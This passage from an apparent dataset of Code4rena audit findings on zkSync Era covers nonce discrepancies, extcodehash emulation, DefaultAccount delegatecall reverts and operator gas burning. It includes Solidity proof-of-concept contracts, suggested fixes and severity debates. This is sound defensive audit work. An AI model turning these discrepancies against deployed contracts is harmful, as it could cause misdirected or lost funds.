    L1_MESSENGER_CONTRACT.sendToL1(_rawCompressedData);\n        KNOWN_CODE_STORAGE_CONTRACT.markBytecodeAsPublished(bytecodeHash);\n    }\n```\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/71#issuecomment-1794747554):**\n > Valid report. This report is about providing useless long compressed data leading to consume user’s gas more (if it consumes much gas, nothing is left for the execution, so it will fail).\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/71#issuecomment-1829778364):**\n > The Warden has shown a way for the Operator to burn excess gas as a strategy to maximize profits, since this directly conflicts with the refund system. Medium seems appropriate.\n\n\n",
      "summary": "\nThis bug report discusses a potential issue in the zkSync system where malicious operators could artificially increase the length of a dictionary used for compressing data, resulting in higher gas costs for users. This undermines the intended efficiency and cost-effectiveness of the compression mechanism. The report provides a proof of concept and recommends a mitigation strategy to address this issue. The bug has been confirmed and categorized as a medium severity issue by the team. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/71",
      "tags": [],
      "finders": [
        "Audittens",
        "zkrunner",
        "OffsideLabs",
        "anon"
      ]
    },
    {
      "id": "30300",
      "title": "[M-21] Deployment Nonce Does not Increment For a Reverted Child Contract",
      "impact": "MEDIUM",
      "content": "\nThere is an inconsistency between zkSync Era and Ethereum Virtual Machine (EVM) in handling deployment nonce leading to significant consequences. In EVM, the factory's nonce is increased at the beginning of child contract creation, and if the child contract's creation fails, the nonce is not rolled back. In zkSync Era, the deployment nonce increases during the deployment process, and if the child contract constructor reverts, the entire transaction, including the increased deployment nonce, also reverts.\n\n### Proof of Concept\n\nIn zkSync Era, when a factory contract deploys another contract using low-level creation operations (i.e. using `CREATE` or `CREATE2` in assembly, instead of using `new`), it is expected that the deployment nonce of the factory will increment by one, akin to the behavior in the Ethereum Virtual Machine (EVM). However, a notable issue arises when the constructor of the child contract encounters a revert.\n\nIn the EVM, the nonce of the factory increases as soon as the `CREATE` operation begins, regardless of whether the child contract creation is ultimately successful. This can be seen in `GETH` codebase, where the nonce of the factory is increased at line 431. Then, the EVM captures a snapshot, at line 443, to manage any potential failures, allowing for a graceful revert, at line 492, in case of unsuccessful child contract creation. In such cases, the returned address is `address(0),` indicating a failed contract creation attempt.\n\n<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L431><br>\n<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L443><br>\n<https://github.com/ethereum/go-ethereum/blob/dc34fe8291bfcaefbce97f559e9610beffb2e470/core/vm/evm.go#L492>\n\nHowever, zkSync Era differs in its approach. When the `CREATE` opcode is employed, it invokes the `create` or `create2` function within the `ContractDeployer` contract.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L146><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L130>\n\nThis action results in the incremented deployment nonce of the factory, and, in the final stages of contract creation, it calls the constructor of the child contract.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L189><br>\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L344>\n\nIn the event of a revert in the child contract's constructor, the entire transaction in the `ContractDeployer` is reverted. Consequently, the incremented deployment nonce of the factory is also rolled back, and the returned address signifies an unsuccessful contract creation attempt by being set to `address(0).`\n\nThis divergence in nonce management between zkSync Era and the EVM could have far-reaching implications, especially for factories that are deployed on zkSync Era and assume that the deployment nonce behaves in a manner consistent with the EVM.\n\n### PoC\n\nCalling the function `test` triggers the internal function `deploy` three times. In each call, the child contract is deployed, and two values are returned: the predicted address of the to-be-deployed child and the address of the deployed child. The first and third deploy calls provide `false` as an argument to ensure that the constructor of the child doesn't revert. In the second deploy call, `true` is used as an argument, causing the constructor of the child to revert.\n\nComparing the predicted addresses with the deployed addresses reveals the following:\n\n- In EVM: When the second child contract reverts, the factory's nonce increases. Consequently, the predicted address of the third child still matches its deployed address.\n- In zkSync Era: When the second child contract reverts, the factory's nonce remains unchanged. As a result, the deployed address of the **third** child matches the predicted address of the **second** child.\n\nIt's worth noting that the initial value of the variable `nonce` is set to one for the EVM PoC, while it is set to zero for the zkSync Era PoC. This difference is unrelated to this report and has been explained in a separate report.\n\n**In EVM:**\n\n```solidity\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\ncontract Factory {\n    uint256 nonce = 1;\n\n    address public predictedAddress1;\n    address public predictedAddress2;\n    address public predictedAddress3;\n\n    address public deployedAddress1;\n    address public deployedAddress2;\n    address public deployedAddress3;\n\n    function test() public {\n        (predictedAddress1, deployedAddress1) = deploy(false);\n        (predictedAddress2, deployedAddress2) = deploy(true);\n        (predictedAddress3, deployedAddress3) = deploy(false);\n    }\n\n    function deploy(bool _shouldRevert) internal returns (address, address) {\n        bytes memory bytecode = type(Child).creationCode;\n        bytecode = abi.encodePacked(bytecode, abi.encode(_shouldRevert));\n\n        address addr;\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        return (predict(), addr);\n    }\n\n    function predict() public returns (address) {\n        address predicted = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            bytes1(0xd6),\n                            bytes1(0x94),\n                            address(this),\n                            uint8(nonce++)\n                        )\n                    )\n                )\n            )\n        );\n        return predicted;\n    }\n}\n\ncontract Child {\n    constructor(bool _shouldRevert) {\n        if (_shouldRevert) {\n            revert();\n        }\n    }\n}\n\n```\n\nThe result for EVM is:\n\n- `predictedAddress1`: 0xbd5b354220B250DF257ed5e988Fe8FE81CdB6235\n- `deployedAddress1`: 0xbd5b354220B250DF257ed5e988Fe8FE81CdB6235\n- `predictedAddress2`: 0x02180dD815cA64898F6126f3911515B06D17acaD\n- `deployedAddress2`: 0x0000000000000000000000000000000000000000\n- `predictedAddress3`: 0x0A9C6D9d0AF27FC9F3F96196c3F8c89C79Df287D\n- `deployedAddress3`: 0x0A9C6D9d0AF27FC9F3F96196c3F8c89C79Df287D\n\n**In zkSync Era:**\n\n```\n// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.17;\n\ncontract Factory {\n    uint256 nonce = 0;\n\n    address public predictedAddress1;\n    address public predictedAddress2;\n    address public predictedAddress3;\n\n    address public deployedAddress1;\n    address public deployedAddress2;\n    address public deployedAddress3;\n\n    function test() public {\n        (predictedAddress1, deployedAddress1) = deploy(false);\n        (predictedAddress2, deployedAddress2) = deploy(true);\n        (predictedAddress3, deployedAddress3) = deploy(false);\n    }\n\n    function deploy(bool _shouldRevert) internal returns (address, address) {\n        bytes memory bytecode = type(Child).creationCode;\n        bytecode = abi.encodePacked(bytecode, abi.encode(_shouldRevert));\n\n        address addr;\n        assembly {\n            addr := create(0, add(bytecode, 0x20), mload(bytecode))\n        }\n\n        return (predict(), addr);\n    }\n\n    function predict() public returns (address newAddress) {\n        bytes32 hash = keccak256(\n            bytes.concat(\n                keccak256(\"zksyncCreate\"),\n                bytes32(uint256(uint160(address(this)))),\n                bytes32(nonce++)\n            )\n        );\n\n        newAddress = address(uint160(uint256(hash)));\n    }\n}\n\ncontract Child {\n    constructor(bool _shouldRevert) {\n        if (_shouldRevert) {\n            revert();\n        }\n    }\n}\n\n```\n\nThe result for zkSync Era is:\n\n- `predictedAddress1`: 0xBADCfBd5E90eA6558580B8C6220b750E9438df7c\n- `deployedAddress1`: 0xBADCfBd5E90eA6558580B8C6220b750E9438df7c\n- `predictedAddress2`: 0xB7E8A1191E6Ef0F3A752eCaa050F0FF7BcaEAF51\n- `deployedAddress2`: 0x0000000000000000000000000000000000000000\n- `predictedAddress3`: 0xfBAE6B995fe81b48A5e389A81E8Af0ee2AaF7302\n- `deployedAddress3`: 0xB7E8A1191E6Ef0F3A752eCaa050F0FF7BcaEAF51\n\nAs you see, the `deployedAddress3` is equal to `predictedAddress2` which is not correct.\n\n### Recommended Mitigation Steps\n\nA potential solution might involve invoking the `_constructContract` function externally within a try/catch block. By doing so, if `_constructContract` reverts (as occurred with the child contract), the deployment nonce won't be rolled back. However, implementing this kind of modification would necessitate reviewing and changing other parts of the code as well.\n\n    function _performDeployOnAddress(\n            bytes32 _bytecodeHash,\n            address _newAddress,\n            AccountAbstractionVersion _aaVersion,\n            bytes calldata _input\n        ) internal {\n            // ...\n\n            try this.constructContract(msg.sender, _newAddress, _bytecodeHash, _input, false, true){//...}\n            catch{//...}\n              \n        }\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1794566240):**\n > This can have high impact (it depends on the context), and the probability is medium to high (implementing factory contract is frequent). Medium severity can be fair.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1829785428):**\n > At this time, I am marking the finding as Medium for EVM non equivalence. Please do raise concerns if you can show a specific way to cause loss of funds or broken behaviour for contracts that are widely used.\n\n**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1836092181):**\n > This issue may pose a challenge when a factory contract, sharing the same address, is deployed on different chains and is intended to generate multiple proxy contracts with identical addresses (because the address of the created proxy contract relies on the factory's address and its nonce).\n> \n> Consider a situation where a factory is deployed with the same address on both Ethereum and zkSync Era (its forks, or other chains). The address of the proxy contract generated by this factory is dependent on the factory's address and its nonce. If, for any reason, a proxy creation fails (for instance, encountering a REVERT during the execution of its `initcode` or running out of gas), the nonce of the factory will increase on Ethereum but not in the zkSync Era. Consequently, the nonces of the factory on both chains will no longer be synchronized, leading to divergent addresses for proxies created by this factory on the two chains going forward.\n> \n> ```solidity\n> // SPDX-License-Identifier: MIT\n> pragma solidity 0.8.20;\n> \n> contract Factory {\n> \n>     function deploy(bytes[] memory _proxy) external {\n>         bytes memory bytecode;\n> \n>         for (uint256 i = 0; i < _proxy.length; ++i) {\n>             bytecode = _proxy[i];\n>             assembly {\n>                 pop(create(0, add(bytecode, 0x20), mload(bytecode)))\n>             }\n>         }\n>     }\n> \n>     function proxyAddress(uint256 _nonce) public view returns (address) {\n>         address predicted = address(\n>             uint160(\n>                 uint256(\n>                     keccak256(\n>                         abi.encodePacked(\n>                             bytes1(0xd6),\n>                             bytes1(0x94),\n>                             address(this),\n>                             uint8(_nonce)\n>                         )\n>                     )\n>                 )\n>             )\n>         );\n>         return predicted;\n>     }\n> }\n> ```\n> \n> Given the frequent implementation of factory contracts (whether for ensuring the consistency of proxy contract addresses across different chains or for other use cases), the impact classification of this issue can be high.\n\n**[unforgiven (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1837486592):**\n > Regarding your above [comment](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1836092181), which says:\n> >Consider a situation where a factory is deployed with the same address on both Ethereum and zkSync Era (its forks, or other chains).\n> \n> I want to mention that according to the [docs](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/docs/Smart%20contract%20Section/L1%20smart%20contracts.md#L86) currently it's impossible to for Ethereum and zkSync contract to have `sameaddress`:\n>\n> > For most of the rollups the address aliasing needs to prevent cross-chain exploits that would otherwise be possible if we simply reused the same L1 addresses as the L2 sender. In zkSync Era address derivation rule is different from the Ethereum, so cross-chain exploits are already impossible. However, zkSync Era may add full EVM support in the future, so applying address aliasing leaves room for future EVM compatibility.\n\n**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1837605662):**\n > You are correct that the address derivation in zkSync Era differs from Ethereum. However, my key point is that developers considering the idea of using a factory to generate proxies with identical addresses (on zkSync Era, its forks, and etc.) will encounter the issue of nonce asynchronization.\n\n**[miladpiri (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1839001570):**\n > Agree. This can be an issue.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/91#issuecomment-1840776387):**\n > I believe that the finding is valid and Medium. It can cause issues, in some specific scenarios, which are possible but not as common and they are implementation reliant. The issues are not guaranteed, the behaviour is \"sometimes\" wrong.\n> \n> If a contract factory was in scope, I can see the argument for raising the severity; but a `create2` or `create3` deployer, as well as common factories with mappings for children, would work as intended, leading me to confirm Medium Severity as the most appropriate.\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the deployment nonce in zkSync Era and Ethereum Virtual Machine (EVM). In EVM, the nonce increases at the beginning of child contract creation, but if the creation fails, the nonce is not rolled back. In zkSync Era, the nonce increases during deployment, and if the child contract's constructor fails, the entire transaction is reverted, including the incremented nonce. This can have significant consequences, especially for factory contracts that assume the nonce behaves like in EVM. The report includes a proof of concept showing the difference in behavior between EVM and zkSync Era. The severity of this issue is considered medium, as it may not always occur and is implementation reliant. However, it could still have a high impact in certain scenarios. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/91",
      "tags": [],
      "finders": [
        "anon"
      ]
    },
    {
      "id": "30299",
      "title": "[M-20] Nonce Behavior Discrepancy Between zkSync Era and EIP-161",
      "impact": "MEDIUM",
      "content": "\nThe discrepancy in deployment nonce behavior between zkSync Era and EVM can cause problems for contract factories and developers. zkSync Era starts the deployment nonce at zero, unlike the EVM, where it starts at one. This difference may lead to incorrect predictions of child contract addresses.\n\n### Proof of Concept\n\nAs per EIP-161, it's specified that account creation transactions and the CREATE operation should increase the nonce beyond its initial value by **one**.\n\n<https://github.com/ethereum/EIPs/blob/master/EIPS/eip-161.md#specification>\n\n> Account creation transactions and the CREATE operation SHALL, prior to the execution of the initialisation code, increment the nonce over and above its normal starting value by one (for normal networks, this will be simply 1, however test-nets with non-zero default starting nonces will be different).\n\nIn other words, when an EOA (for example with nonce 100) deploys a contract (named as \"contract X\"), the nonces will be (please note that the nonce of the newly-deployed contract X is also incremented by one):\n\n    nonce(EOA): 100 -> 101 \n    nonce(contract X): 0 -> 1\n\nAnd when in another transaction, this contract X deploys another contract (named as \"contract Y\"), the nonces will be (again please note that the nonce of the newly-deployed contract Y is also incremented by one):\n\n    nonce(EOA): 101 -> 102 \n    nonce(contract X): 1 -> 2\n    nonce(contract Y): 0 -> 1\n\nHowever, during the zkSync Era, there is a divergence from the Ethereum standard. In this context, the deployment nonce for a newly created contract initiates at zero. This deviation from the EVM standard can impact factories that anticipate the addresses of child contracts and make decisions based on these assumptions. Such factories might mistakenly assume that their nonce starts at 1, mirroring the EVM, leading to discrepancies between anticipated and actual addresses of the deployed child contracts.\n\n### Recommended Mitigation Steps\n\nIt is advisable to increment the deployment nonce of a contract by one before invoking its constructor. Moreover, this contrast should be documented to provide clarity for developers.\n\n    function _constructContract(\n            address _sender,\n            address _newAddress,\n            bytes32 _bytecodeHash,\n            bytes calldata _input,\n            bool _isSystem,\n            bool _callConstructor\n        ) internal {\n            NONCE_HOLDER_SYSTEM_CONTRACT.incrementDeploymentNonce(_newAddress);\n            //...\n        }\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/ContractDeployer.sol#L322>\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) acknowledged and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1803654621):**\n > Medium/Low. The impact can be high (depending on the context), and probality is medium to high (any factory can be affected).\n> I am thinking that if a factory creates a child, and child also creates second contract, and factory already transfers ETH to the second contract address (assuming that nonce of child is one, leading to predict the second contract address wrongly). Fund is lost. \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1812462720):**\n > We have an historical record of awarding non-evm equivalence that can cause damage as med, so I'm inclined to maintain the severity. Will double check.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1826878015):**\n > The Warden has shown a discrepancy in the CREATE opcode for Contracts deployed on the zkEVM. While impact should be low in many scenarios, this highlights a discrepancy between zkEVM and EVM, which is notable, for this reason Medium Severity seems most appropriate.\n\n**[anon (warden) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1836074188):**\n > The identified issue could potentially affect numerous widely-used projects and libraries. As an illustration:\n> \n> The create3 library facilitates EVM contract creation, resembling `CREATE2` but differing in that it excludes the contract `initCode` from the address derivation formula. The process involves employing the `CREATE2` method to deploy a new proxy contract, which subsequently deploys the child contract using `CREATE`. This keyless deployment approach removes reliance on the account owner who deployed the factory contract.\n> \n> Examining the `CREATE3` library in [solmate](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L9) or [solady](https://github.com/Vectorized/solady/blob/main/src/utils/CREATE3.sol#L8), the child contract's address is computed based on the [address](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L77-L85) of the proxy contract and its nonce. Notably, the [nonce](https://github.com/transmissions11/solmate/blob/main/src/utils/CREATE3.sol#L83) of the proxy contract is hardcoded as `hex\"01\"`. This choice aligns with EIP-161, specifying that account creation transactions and the `CREATE` operation should increment the nonce beyond its initial value by one. However, in the zkSync Era, the nonce does not increase by one, so unexpectedly this mechanism does not work on zkSync Era as on EVM.\n> \n> Given that this library or a similar mechanism is widely used (as seen in [AxelarNetwork](https://github.com/axelarnetwork/axelar-gmp-sdk-solidity/blob/main/contracts/deploy/Create3.sol#L15) and [MeanFinance](https://github.com/Mean-Finance/deterministic-factory/blob/main/solidity/contracts/DeterministicFactory.sol#L8)), any deviation from the expected behavior could impact numerous contracts dependent on the correct address of the child contract. \n> \n> Consequently, I assert that the significance of this bug should be classified as high.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1845202289):**\n > After reviewing the issue and consulting with another Judge.\n> \n> While the issue is notable, I believe that the finding is limited in its impact in the sense that it shows a discrepancy against the EVM. Integrators would be subject to an incorrect functionality which would be found rationally through the first usage or an integration test.\n> \n> In the case in which said factory was in scope, then a High Severity would have been appropriate. But in lack of it, the finding impacts the compatibility of zkSync with the EVM, meaning Medium Severity is most appropriate.\n\n**[vladbochok (zkSync) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/92#issuecomment-1855335245):**\n > 1. Nonce is not visible inside the VM execution, the only resulted address will be derived from the nonce `1`, not `0`.\n> 2. The rule of address derivation on Era is different. Not only by a specific different formula but also by using two separate nonces - deployment nonce and min nonce. One is used for deployment and another for the contract address derivation. That is different from Ethereum itself, and has much bigger impact on the address prediction than just nonce that nonce value been used in the derivation. \n> \n> I do think that the maximum impact is low, due to the reason that only infra is affected, I would like to see the real contract deployed on Ethereum that would affected rather than very hypothetical assumptions about developers and users. The likelihood is also very low. All in all, I don't think this issue has proven to have some severity. \n\n***\n\n",
      "summary": "\nThis report highlights a discrepancy in the deployment nonce behavior between zkSync Era and EVM, which can cause problems for contract factories and developers. While the EVM starts the deployment nonce at one, zkSync Era starts it at zero. This difference can lead to incorrect predictions of child contract addresses, potentially impacting widely-used projects and libraries. The severity of this bug has been debated, with some considering it to be medium or high, while others believe it to be low. However, it is recommended to increment the deployment nonce of a contract by one before invoking its constructor and to document this difference for clarity. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/92",
      "tags": [],
      "finders": [
        "anon"
      ]
    },
    {
      "id": "30298",
      "title": "[M-19] Divergences in the Simulation of the `extcodehash` EVM Opcode",
      "impact": "MEDIUM",
      "content": "\nThe divergences in the emulation of the `extcodehash` EVM opcode within zkSync Era carry several potential impacts, specially on Developers relying on zkSync Era's assurance that it emulates the `extcodehash` opcode as per EIP-1052 might encounter unexpected behavior in their smart contracts.\n\n### Proof of Concept\n\nThe `getCodeHash` function within the zkSync Era is designed to emulate the functionality of the `extcodehash` Ethereum Virtual Machine (EVM) opcode, as laid out in the Ethereum Improvement Proposal 1052 (EIP-1052). \n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/AccountCodeStorage.sol#L89>\n\nHowever, it's important to recognize that this function does not exhibit precisely identical behavior to the EVM's `extcodehash` opcode. There are specific discrepancies:\n\n1. EIP-161 defines an account as \"empty\" when it satisfies certain criteria: no code, a nonce value of zero, and a balance of zero. According to EIP-1052, the `extcodehash` of an empty account should evaluate to `bytes32(0)`. In the zkSync Era, the behavior aligns with this definition when `codeHash` is `0x00`, `getRawNonce(account)` is `0`, and `isContractConstructing(codeHash)` is `false`. If an account has nonzero balance, then based on the definition of EIP-161, it will not be considered as an empty account anymore. In this case, that account will be considered as an account with no code. So, `extcodehash` of such account will be `keccak256(\"\")` in EVM.\n\n**The issue is that, zkSync Era returns `bytes32(0)` regardless of the balance of the account. It only cares about the nonce and the code.**\n\n2. Based on EIP-1052, the `extcodehash` of an precompile contract is either `keccak256(\"\")` or `bytes32(0)`. For instance, the `extcodehash` of `address(0x02)`—representing the SHA-256 precompile contract in the EVM—should be `keccak256(\"\")` because it has no code, a nonce of zero, and a nonzero balance.\n\n**In contrast, the zkSync Era consistently returns `keccak256(\"\")` for precompile contracts, regardless of their balances. The zkSync Era's behavior is based solely on whether the address is lower/equal to `CURRENT_MAX_PRECOMPILE_ADDRESS`.**\n\nThese observed inconsistencies could potentially raise concerns for developers who rely on zkSync Era's assertion that it accurately simulates the `extcodehash` EVM opcode as dictated by the EIP-1051 specification.\n\n### Recommended Mitigation Steps\n\nThe following code is recommended to simulate the `extcodehash` EVM opcode precisely based on EIP-1052.\n\n```solidity\nfunction getCodeHash(uint256 _input) external view override returns (bytes32) {\n\n        address account = address(uint160(_input));\n        if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && account.balance != 0) {\n            return EMPTY_STRING_KECCAK;\n        } else if (uint160(account) <= CURRENT_MAX_PRECOMPILE_ADDRESS && address(account).balance == 0) {\n            return bytes32(0);\n        }\n\n        bytes32 codeHash = getRawCodeHash(account);\n\n        if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) > 0) {\n            codeHash = EMPTY_STRING_KECCAK;\n        }\n        else if (Utils.isContractConstructing(codeHash)) {\n            codeHash = EMPTY_STRING_KECCAK;\n        } else if (codeHash == 0x00 && NONCE_HOLDER_SYSTEM_CONTRACT.getRawNonce(account) == 0 && address(account).balance != 0) {\n            codeHash = EMPTY_STRING_KECCAK;\n        }\n\n        return codeHash;\n    }\n```\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/code/system-contracts/contracts/AccountCodeStorage.sol#L89>\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1794951243):**\n > The impact is medium, the probability is low. So, low severity can be fair.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1826035774):**\n > While I agree with low impact, this seem to be an inconsistency in the implementation of the EVM, which makes the finding notable.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/133#issuecomment-1826036942):**\n > I would have a different perspective for an ERC or some implementation; however, in this case this is an opcode that behaves differently (although in a edge case). At this time, I believe Medium Severity is most appropriate as the finding demonstrates an inconsistent behaviour of the EVM with the zkSyncVM, as it breaks a coding convention that goes beyond a best-practice.\n\n***\n\n",
      "summary": "\nThe report discusses a bug in the zkSync Era's emulation of the `extcodehash` EVM opcode. This bug could potentially cause unexpected behavior in smart contracts relying on the zkSync Era's assurance that it accurately simulates the opcode as per EIP-1052. The bug involves discrepancies in the behavior of the `getCodeHash` function, which is designed to emulate `extcodehash`. The report provides a recommended solution to mitigate the bug and assesses it as a medium impact with low probability. However, the judges believe the bug is notable as it demonstrates an inconsistent behavior of the EVM with the zkSyncVM and suggest a medium severity rating.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/133",
      "tags": [],
      "finders": [
        "0xstochasticparrot",
        "anon",
        "rvierdiiev",
        "quarkslab",
        "erebus"
      ]
    },
    {
      "id": "30297",
      "title": "[M-18] Discrepancy in Default Account Behavior",
      "impact": "MEDIUM",
      "content": "\nReverts in default account fallback function (when custom accounts delegate calls to a default account) may introduce security risks as protocols might not anticipate these reverts, resulting in vulnerabilities.\n\n### Proof of Concept\n\nAs stated in the documentation regarding the `DefaultAccount`:\n\n> The main purpose of this contract is to provide EOA-like experience for both wallet users and contracts that call it, i.e. it should not be distinguishable (apart of spent gas) from EOA accounts on Ethereum.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/main/docs/Smart%20contract%20Section/System%20contracts%20bootloader%20description.md#defaultaccount>\n\nTo achieve this EOA-like behavior, the fallback and receive functions of the `DefaultAccount` contract are designed in such a way that, when called or delegate-called, they mimic the actions of an EOA:\n\n```solidity\nfallback() external payable {\n    // The fallback function of the default account should never be called by the bootloader\n    assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);\n\n    // If the contract is called directly, it should behave like an EOA.\n}\n\nreceive() external payable {\n    // If the contract is called directly, it should behave like an EOA.\n}\n```\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L222-L231>\n\nHowever, there's an exception to this EOA-like behavior when **a custom account delegate-calls a default account**. Suppose the custom account execution function is implemented as follows:\n\n```solidity\nfunction _execute(Transaction calldata _transaction) internal {\n    address to = address(uint160(_transaction.to));\n    (bool success,) = address(to).delegatecall(\"0x1234\");\n    require(success, \"call was not successful\");\n}\n```\n\nIn this scenario, if the `to` address is a default account, the fallback function of the default account will be invoked. Since the `msg.sender` is the bootloader address, it will trigger a revert due to `assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS)` and `success` will be `false`. This is not the expected behavior, as `to` should act like an EOA and `success` should be true.\n\n<https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/system-contracts/contracts/DefaultAccount.sol#L224>\n\nThis situation can potentially pose a significant issue for several reasons:\n\n1. Due to the unpredictability of custom account implementations, any assertion claiming that custom accounts will not delegate calls to a default account lacks a solid foundation.\n2. ZkSync Era has explicitly stated that default accounts should not be distinguishable (apart of spent gas) from EOA accounts on Ethereum. Protocols and custom accounts deployed on ZkSync Era are likely to rely on this statement, believing that they will observe consistent behavior. In practice, they might encounter different behavior, which could lead to unexpected consequences.\n\n### Recommended Mitigation Steps\n\nOne potential solution is to add modifier `ignoreInDelegateCall` to the fallback function as well:\n\n```solidity\n    fallback() external payable ignoreInDelegateCall {\n        assert(msg.sender != BOOTLOADER_FORMAL_ADDRESS);\n    }\n```\n\n### Assessed type\n\nContext\n\n**[miladpiri (zkSync) confirmed and commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/168#issuecomment-1794964537):**\n > It is showing that default account is not purely simulating EOA. So, medium is fair.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/168#issuecomment-1829775920):**\n > The Warden has shown an edge case for Default Accounts, due to this being a discrepancy in intended behaviour, Medium Severity seems most appropriate.\n\n***\n\n",
      "summary": "\nThe bug report discusses an issue with the default account fallback function in the ZkSync Era. This function is designed to mimic the behavior of an externally owned account (EOA) on Ethereum, but there is an exception when a custom account delegate-calls a default account. This can lead to unexpected reverts and potentially pose security risks for protocols and custom accounts relying on the expected behavior. The recommended mitigation step is to add a modifier to the fallback function. The severity of this bug is assessed as medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "https://github.com/code-423n4/2023-10-zksync-findings/issues/168",
      "tags": [],
      "finders": [
        "Audittens",
        "anon"
      ]
    },
    {
      "id": "30296",
      "title": "[M-17] Discrepancy in ECRECOVER Precompile when Using `Delegatecall`",
      "impact": "MEDIUM",
